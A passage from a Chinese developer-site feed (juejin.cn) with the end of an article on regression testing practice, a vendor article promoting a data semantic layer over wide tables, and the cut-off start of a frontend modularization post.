<span class="hljs-bullet">4.</span> 验证：稳定运行30次后重新纳入主套件
<span class="hljs-bullet">5.</span> 淘汰：30天内无法修复的测试考虑淘汰
</code></pre>
</li>
</ol>
<h3 data-id="heading-14">3.4 第四阶段：度量与持续改进</h3>
<h4 data-id="heading-15">3.4.1 关键度量指标</h4>





















































<table><thead><tr><th>指标类别</th><th>具体指标</th><th>目标值</th><th>测量频率</th></tr></thead><tbody><tr><td>效率指标</td><td>测试执行时间</td><td>&lt;1小时（CI/CD流水线）</td><td>每次构建</td></tr><tr><td/><td>自动化率</td><td>&gt;70%（单元/集成）</td><td>每月</td></tr><tr><td>质量指标</td><td>缺陷逃逸率</td><td>&lt;5%</td><td>每次发布</td></tr><tr><td/><td>回归测试捕获缺陷比例</td><td>&gt;30%</td><td>每次发布</td></tr><tr><td>稳定性指标</td><td>测试通过率</td><td>&gt;95%</td><td>每次构建</td></tr><tr><td/><td>不稳定测试比例</td><td>&lt;2%</td><td>每周</td></tr><tr><td>成本指标</td><td>测试维护成本/总开发成本</td><td>&lt;15%</td><td>每季度</td></tr></tbody></table>
<h4 data-id="heading-16">3.4.2 根本原因分析（RCA）流程</h4>
<p>对于每个逃逸到生产环境的缺陷，执行5Why分析：</p>
<ol>
<li>为什么回归测试没发现这个缺陷？</li>
<li>为什么相关测试用例不存在/不完善？</li>
<li>为什么测试用例设计时遗漏了这个场景？</li>
<li>为什么需求/设计评审时没识别出这个风险？</li>
<li>为什么我们的流程/文化导致了这个盲点？</li>
</ol>
<h2 data-id="heading-17">4. 现代回归测试的先进实践</h2>
<h3 data-id="heading-18">4.1 基于机器学习的智能测试选择</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 智能测试选择系统概念</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">IntelligentTestSelector</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, historical_data</span>):
        self.model = self.train_model(historical_data)
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">train_model</span>(<span class="hljs-params">self, data</span>):
        <span class="hljs-string">"""训练预测模型：代码变更 -&gt; 可能影响的测试"""</span>
        features = [
            <span class="hljs-string">'changed_modules'</span>,
            <span class="hljs-string">'developer_experience'</span>,
            <span class="hljs-string">'time_since_last_change'</span>,
            <span class="hljs-string">'historical_failure_rate'</span>
        ]
        <span class="hljs-comment"># 使用随机森林或神经网络预测</span>
        <span class="hljs-keyword">return</span> trained_model
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select_tests</span>(<span class="hljs-params">self, current_change</span>):
        predictions = self.model.predict(current_change)
        <span class="hljs-keyword">return</span> self.optimize_selection(predictions)
</code></pre>
<h3 data-id="heading-19">4.2 容器化与测试环境管理</h3>
<ol>
<li>
<p><strong>按需测试环境</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Docker Compose定义完整测试环境</span>
<span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">app-under-test:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">myapp:${BUILD_NUMBER}</span>
    
  <span class="hljs-attr">test-database:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">postgres:13</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_DB=test_db</span>
    
  <span class="hljs-attr">mock-services:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">wiremock:2.32</span>
    
  <span class="hljs-attr">test-runner:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">test-executor:latest</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-under-test</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">test-database</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">pytest</span> <span class="hljs-string">/tests/regression</span>
</code></pre>
</li>
<li>
<p><strong>测试数据管理</strong>：</p>
<ul>
<li>黄金数据集：核心业务流程的标准化数据</li>
<li>合成数据生成：敏感数据的替代方案</li>
<li>数据库快照：快速重置测试状态</li>
</ul>
</li>
</ol>
<h3 data-id="heading-20">4.3 可视化回归测试</h3>
<p>对于UI密集型应用，实施像素级比较：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 可视化回归测试流程</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">visualRegressionTest</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 1. 基线截图</span>
  <span class="hljs-keyword">const</span> baseline = <span class="hljs-keyword">await</span> <span class="hljs-title function_">screenshot</span>(<span class="hljs-string">'homepage'</span>);
  
  <span class="hljs-comment">// 2. 新版本截图</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">deployNewVersion</span>();
  <span class="hljs-keyword">const</span> current = <span class="hljs-keyword">await</span> <span class="hljs-title function_">screenshot</span>(<span class="hljs-string">'homepage'</span>);
  
  <span class="hljs-comment">// 3. 比较与报告</span>
  <span class="hljs-keyword">const</span> diff = <span class="hljs-keyword">await</span> <span class="hljs-title function_">compareImages</span>(baseline, current);
  
  <span class="hljs-keyword">if</span> (diff.<span class="hljs-property">percentage</span> &gt; <span class="hljs-number">0.1</span>) { <span class="hljs-comment">// 允许的差异阈值</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">generateReport</span>({
      <span class="hljs-attr">diffImage</span>: diff.<span class="hljs-property">image</span>,
      <span class="hljs-attr">changedAreas</span>: diff.<span class="hljs-property">areas</span>,
      <span class="hljs-attr">approvalRequired</span>: <span class="hljs-literal">true</span>
    });
  }
}
</code></pre>
<h2 data-id="heading-21">5. 组织与文化维度</h2>
<h3 data-id="heading-22">5.1 回归测试的所有权模型</h3>
<ol>
<li><strong>开发人员负责制</strong>：编写和维护单元/集成测试</li>
<li><strong>测试工程师负责制</strong>：系统测试、E2E测试和测试框架</li>
<li><strong>共享所有权</strong>：结对编写测试，集体维护测试套件</li>
</ol>
<h3 data-id="heading-23">5.2 持续改进的文化建设</h3>
<ol>
<li><strong>测试卓越周</strong>：每季度专注改进测试基础设施</li>
<li><strong>测试代码评审</strong>：与产品代码同等严格的评审标准</li>
<li><strong>质量度量透明化</strong>：公开展示回归测试健康度</li>
</ol>
<h2 data-id="heading-24">6. 案例研究：中型电商平台的回归测试演进</h2>
<h3 data-id="heading-25">背景</h3>
<ul>
<li>团队规模：15个开发，5个测试</li>
<li>发布频率：从每月发布到每周发布</li>
<li>挑战：回归测试时间从2小时增加到8小时</li>
</ul>
<h3 data-id="heading-26">实施步骤</h3>
<ol>
<li><strong>第1个月</strong>：建立自动化基础，关键路径E2E测试自动化率从30%提升到60%</li>
<li><strong>第2个月</strong>：引入基于风险的测试选择，执行时间减少40%</li>
<li><strong>第3个月</strong>：实施分层测试策略，单元测试覆盖率从45%提升到75%</li>
<li><strong>第4个月</strong>：优化不稳定测试，通过率从88%提升到96%</li>
</ol>
<h3 data-id="heading-27">成果</h3>
<ul>
<li>回归测试执行时间：8小时 → 45分钟</li>
<li>缺陷逃逸率：8% → 2.5%</li>
<li>发布信心指数：中等 → 高</li>
</ul>
<h2 data-id="heading-28">7. 结论与未来趋势</h2>
<p>回归测试已从质量保障的附加活动演变为<strong>软件交付管道的核心组件</strong>。未来的发展趋势包括：</p>
<ol>
<li><strong>AI驱动的智能测试</strong>：基于代码语义和理解业务逻辑的测试生成</li>
<li><strong>混沌工程集成</strong>：在回归测试中主动注入故障，验证系统韧性</li>
<li><strong>生产环境回归</strong>：在受控条件下对生产流量进行A/B测试</li>
<li><strong>完全自动化修复</strong>：AI不仅发现问题，还能生成修复代码</li>
</ol>
<p>成功实施回归测试的关键在于<strong>平衡</strong>——在测试覆盖度、执行时间、维护成本和发现缺陷能力之间找到组织的最优平衡点。这需要技术、流程和文化的综合演进，而非单纯工具或方法的引入。</p>
<p>回归测试的终极目标不是消除所有缺陷，而是建立一种<strong>可预测的质量信心</strong>，使组织能够以可持续的速度交付高质量软件，快速响应市场变化而不牺牲稳定性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[数据语义层 vs 宽表模式：哪种架构更适合 AI 时代的数据分析？]]></title>    <link>https://juejin.cn/post/7597452210646679552</link>    <guid>https://juejin.cn/post/7597452210646679552</guid>    <pubDate>2026-01-21T11:23:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597452210646679552" data-draft-id="7597635202324693044" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="数据语义层 vs 宽表模式：哪种架构更适合 AI 时代的数据分析？"/> <meta itemprop="keywords" content="数据分析"/> <meta itemprop="datePublished" content="2026-01-21T11:23:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Aloudata大应科技"/> <meta itemprop="url" content="https://juejin.cn/user/1579340474099927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            数据语义层 vs 宽表模式：哪种架构更适合 AI 时代的数据分析？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1579340474099927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Aloudata大应科技
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:23:26.000Z" title="Wed Jan 21 2026 11:23:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 AI 驱动的数据分析时代，传统宽表模式因敏捷性不足、数据冗余和难以支持即席查询而力不从心。相比之下，NoETL 数据语义层（Semantic Layer）作为位于数据存储与应用间的抽象层，通过将物理数据映射为统一业务语义，实现了逻辑与物理解耦。对于需要快速响应变化、支持 AI 交互的场景，语义层架构是更具适应性的选择，能提供零等待的指标交付和 100% 一致的业务口径。</p>
<h2 data-id="heading-0">AI 时代下，传统宽表模式为何力不从心？</h2>
<p>数据分析正从“预制品加工”转向“自助式厨房”。过去支撑报表的宽表模式，在 AI 驱动、即席查询的需求下暴露三大瓶颈：</p>
<ol>
<li>敏捷性坍塌：业务变更需回溯修改 ETL、重跑宽表，响应周期长达数周。</li>
<li>数据一致性失控：多张口径各异的宽表导致“指标打架”，AI 模型基于此将产生不可靠洞察。</li>
<li>无法支持即席查询：宽表只能回答预设问题，无法响应跨域、临时的分析需求。</li>
</ol>
<p>例如，周五下午，市场部需要新指标评估促销活动。数据团队告知需新建宽表，排期至下周三。决策时机已然错过。这种“响应迟滞”在 AI 时代是致命的。</p>
<h2 data-id="heading-1">什么是 NoETL 数据语义层（Semantic Layer）？</h2>
<p>NoETL 数据语义层（Semantic Layer）是数据存储与数据应用间的关键抽象层，其核心功能是将复杂的技术数据结构映射为统一的业务术语和指标，充当数据的“业务翻译官”。其颠覆性源于三大技术理念：</p>
<ol>
<li>解耦逻辑与物理：业务逻辑（如“销售额=价格×数量-折扣”）不再硬编码于 ETL，而是作为可复用定义存储于语义层。</li>
<li>统一业务语义：动态编织明细数据为统一的业务语义，确保全公司对“销售额”只有一个定义，实现“单一事实来源”。</li>
<li>实时查询下推：将“查看华东区销售额”的查询实时翻译、优化并下推至数据源执行，无需移动和预计算数据。</li>
</ol>
<h3 data-id="heading-2">为什么它是 AI 时代的关键？</h3>
<p>AI Agent 需要无歧义的上下文来准确生成 SQL。语义层提供了这份“业务词典”，为 AI 提供了稳定、可靠的数据接口，从根本上避免了因口径混乱导致的“AI 幻觉”。</p>
<h2 data-id="heading-3">Aloudata 如何基于语义层赋能 AI 驱动的分析？</h2>
<p>作为国内数据语义编织（Semantic Fabric）领导者，Aloudata 方案的核心是：用 Aloudata CAN 自动化指标平台构建语义层，用 Aloudata Agent 分析决策智能体作为交互入口。</p>
<p>企业可以通过 Aloudata CAN 中连接数仓明细层，在可视化界面通过配置化的方式定义业务实体、维度和指标，构建语义模型，形成 NoETL 数据语义层，实现业务语义的标准化开发和管理，保障 100% 指标口径的一致性，避免 AI 问数的“幻觉”出现。</p>
<p>以 NoETL 数据语义层为底座，用户可以部署 Aloudata Agent，通过自然语言交互的方式直接提问：“上周新用户首单平均客单价？”Agent 基于语义层理解意图，通过 NL2MQL2SQL 的技术路径，先输出 MQL，再通过指标语义引擎生成 100% 准确的 SQL 语句并返回结果。</p>
<p>在这个过程中，用户零等待指标交付，逻辑变更分钟级生效，无需 ETL；100%一致口径，所有人与 AI 通过同一语义层访问数据；无缝对接 AI，语义层为 AI 提供标准化查询 API。</p>
<h2 data-id="heading-4">常见疑问回答（FAQ）</h2>
<h4 data-id="heading-5">Q: 语义层架构的性能是否比宽表差？</h4>
<p>不会。语义层采用智能查询下推与缓存，其优势在于在保证核心性能的同时，极大扩展了可即时响应的问题范围。</p>
<h4 data-id="heading-6">Q: 已建的宽表和数据仓库，是否要推倒重来？</h4>
<p>不需要。语义层是增强层。Aloudata CAN 可直接连接现有数据资产，在其之上构建统一语义，保护投资的同时解锁新能力。</p>
<h4 data-id="heading-7">Q: 语义层如何保证数据安全与权限控制？</h4>
<p>企业级产品（如 Aloudata CAN）提供行列级权限管控，并将规则与语义模型绑定。任何查询都会自动注入权限过滤，确保安全合规。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端向架构突围系列模块化 [4 - 1]：思想-超越文件拆分的边界思维]]></title>    <link>https://juejin.cn/post/7597623395907846190</link>    <guid>https://juejin.cn/post/7597623395907846190</guid>    <pubDate>2026-01-21T11:50:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597623395907846190" data-draft-id="7597379486428659738" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端向架构突围系列模块化 [4 - 1]：思想-超越文件拆分的边界思维"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-21T11:50:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端王壮壮"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端向架构突围系列模块化 [4 - 1]：思想-超越文件拆分的边界思维
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端王壮壮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:50:27.000Z" title="Wed Jan 21 2026 11:50:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmC